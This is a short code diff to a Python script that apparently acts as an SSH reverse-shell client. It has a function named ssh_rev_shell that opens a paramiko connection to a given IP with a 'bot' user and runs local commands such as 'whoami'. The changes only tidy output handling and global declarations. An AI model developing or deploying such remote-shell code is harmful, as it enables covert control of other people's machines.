@@ -44,11 +44,11 @@ def exec_underlying_command(command):
 
     result = None
     if process.returncode == 0:
-        result = stdout.decode()
+        result = stdout.decode().strip()
     else:
-        result = stderr.decode()
+        result = stderr.decode().strip()
 
-    return result.strip('\n')
+    return result.rstrip()
 
 command = "whoami".encode()
 user = exec_underlying_command(command)
@@ -63,7 +63,7 @@ def max_timeout(seconds=10):
 
 
 def ssh_rev_shell(ip, user, key_file, bot_user, port=22):
-    global ssh_client, ssh_session, user
+    global ssh_client, ssh_session
     ssh_client = paramiko.SSHClient()
 
     ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
@@ -115,7 +115,6 @@ def ssh_rev_shell(ip, user, key_file, bot_user, port=22):
 
 if __name__ == "__main__":
 
-    global user
 
     while True:
         try:
